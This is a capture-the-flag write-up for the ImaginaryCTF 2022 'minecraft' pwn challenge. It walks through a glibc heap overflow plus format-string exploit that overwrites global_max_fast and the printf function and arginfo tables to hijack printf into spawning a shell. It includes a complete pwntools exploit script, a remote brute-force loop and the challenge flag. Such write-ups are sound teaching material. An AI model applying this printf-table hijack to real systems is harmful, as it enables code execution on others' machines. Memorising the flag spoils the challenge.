# ImaginaryCTF 2022 - minecraft

Original challenge: https://2022.imaginaryctf.org/Challenges

You can also download challenge files in my repo: [minecraft.zip](minecraft.zip)

There will be 3 files in zip:
- ld-2.27.so
- libc.so.6
- vuln

Download and extract, then use `pwninit` to patch libc with binary and we can get started!

# 3. Exploit

At first, we have a heap overflow if we malloc a chunk at index 16 first, then a chunk at index 0, the address of second chunk will overwrite the size of first chunk. Hence we can use replace to overwrite stuff.

But after searching on how2heap, we can see no technique can be used because we also have another bug `Format String` when we leak poem. I tried to debug the function `_Exit()` after that printf but `_Exit()` doesn't use any address in any rw section so we cannot attack `_Exit()` hook or something like that.

Searching for `house of "heap" with "printf"`, we came up with a blog of `pre-yudai` [here](https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507).

Due to no libc address, we can use exe stuff. The first try is to overwrite `global_max_fast` by overwrite bk of a freed chunk in unsorted bin as the blog said. Because no libc address can be get so just bruteforce least 2 significant bytes. But before we bruteforce, just run program in static address to be easier when attacking.

Then we edit, modify and overwrite `__printf_arginfo_table` and `__printf_function_table` to execute 1 address we want. The source code to check if `__printf_arginfo_table` and `__printf_function_table` is null can be found [here](https://code.woboq.org/userspace/glibc/stdio-common/printf-parsemb.c.html#55):

```c
if (__builtin_expect (__printf_function_table == NULL, 1)
  || spec->info.spec > UCHAR_MAX
  || __printf_arginfo_table[spec->info.spec] == NULL
  /* We don't try to get the types for all arguments if the format
     uses more than one.  The normal case is covered though.  If
     the call returns -1 we continue with the normal specifiers.  */
  || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
                               (&spec->info, 1, &spec->data_arg_type,
                                &spec->size)) < 0)
{
    ...
}
```

It will first check `__printf_function_table` and if it's not null, it then will check `__printf_arginfo_table` and if it's not null too, the function of `__printf_arginfo_table[spec->info.spec]` will be executed. And because we have overwriten `__printf_arginfo_table[spec->info.spec]` with our desired address, we can execute any address we want.

The only problem is how to get the string `/bin/sh` or just `sh`. After reading source code of `__parse_one_specwc` [here](https://code.woboq.org/userspace/glibc/stdio-common/printf-parsemb.c.html#55), which is an internal function of printf, we can see that rdi is `spec->info.prec` when our function, which is store in `__printf_arginfo_table[spec->info.spec]`, is executed. Hence, we can have string `sh` in rdi by inputting number and this code of libc will help us parse from number to 2 byte `sh`:

```c
/* Get the precision.  */
spec -> prec_arg = -1;
/* -1 means none given; 0 means explicit 0.  */
spec -> info.prec = -1;
if ( * format == L_('.')) {
    ++format;
    if ( * format == L_('*')) {
        /* The precision is given in an argument.  */
        const UCHAR_T * begin = ++format;
        if (ISDIGIT( * format)) {
            n = read_int( & format);
            if (n != 0 && * format == L_('$')) {
                if (n != -1) {
                    spec -> prec_arg = n - 1;
                    * max_ref_arg = MAX( * max_ref_arg, n);
                }
                ++format;
            }
        }
        if (spec -> prec_arg < 0) {
            /* Not in a positional parameter.  */
            spec -> prec_arg = posn++;
            ++nargs;
            format = begin;
        }
    } else if (ISDIGIT( * format)) {
        int n = read_int( & format);
        if (n != -1)
            spec -> info.prec = n;         <--------- This one
    } else
        /* "%.?" is treated like "%.0?".  */
        spec -> info.prec = 0;
}
```

Solve script is:

```python
#!/usr/bin/python3

from pwn import *
import subprocess

def placeblock(idx, len, data):
    p.sendlineafter(b'poem\n', b'p')
    p.sendlineafter(b'idx: \n', str(idx).encode())
    p.sendlineafter(b'len: \n', str(len).encode())
    p.sendafter(b'block: \n', data)

def breakblock(idx, keep=b'n'):
    p.sendlineafter(b'poem\n', b'b')
    p.sendlineafter(b'idx: \n', str(idx).encode())
    p.sendlineafter(b'inventory? \n', keep)

def replaceblock(idx, data):
    p.sendlineafter(b'poem\n', b'r')
    p.sendlineafter(b'idx: \n', str(idx).encode())
    p.sendafter(b'block: \n', data)

def leakpoem(idx):
    p.sendlineafter(b'poem\n', b'l')
    p.sendlineafter(b'idx: \n', str(idx).encode())

exe = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'debug'

def offset2size(offset):
    return offset * 2 - 0x10

# Cannot overwrite _Exit due to no variable is stored
__printf_function_table_offset = 0x3f0738
__printf_function_arginfo_offset = 0x3ec870
global_max_fast_offset = 0x3ed940
main_arena = 0x3ebc40

p = process(exe.path)
# p = remote('golf.chal.imaginaryctf.org', 1337)

placeblock(0, 0x500, b'0'*8)
placeblock(1, offset2size(__printf_function_table_offset - main_arena), b'1'*8)
placeblock(2, offset2size(__printf_function_arginfo_offset - main_arena), p64(0)*0x62 + p64(0x401110))
placeblock(3, 0x500, f'%.26739d\x00'.encode() + b'A'*8)

breakblock(0, b'y')
replaceblock(0, b'A'*8 + p16(0x6940 - 0x10))
placeblock(0, 0x500, f'%.26739d\x00'.encode())

breakblock(1)
breakblock(2)

leakpoem(3)

p.interactive()
```

To get the padding for `__printf_function_arginfo`, debug with gdb and set breakpoint at `__parse_one_specmb+1568`. Run until that and we know the offset will be the ascii of `d` (from our input) multiplied by 8. Hence, padding will be `0x62` because it takes the address containing metadata of that chunk too.

When it can run locally, put the code inside a while loop and loop until we get the shell:

```python
while True:
    # p = process(exe.path)
    p = remote('minecraft.chal.imaginaryctf.org', 1337)

    placeblock(0, 0x500, b'0'*8)
    placeblock(1, offset2size(__printf_function_table_offset - main_arena), b'1'*8)
    placeblock(2, offset2size(__printf_function_arginfo_offset - main_arena), p64(0)*0x62 + p64(0x401110))
    placeblock(3, 0x500, f'%.26739d\x00'.encode() + b'A'*8)

    breakblock(0, b'y')
    replaceblock(0, b'A'*8 + p16(0x6940 - 0x10))
    try:
        placeblock(0, 0x500, f'%.26739d\x00'.encode())
    except:
        p.close()
        continue

    try:
        breakblock(1)
        breakblock(2)
    except:
        p.close()
        continue

    leakpoem(3)

    p.interactive()
```

Flag is `ictf{pr1ntf_is_p0werful_86b21f38}`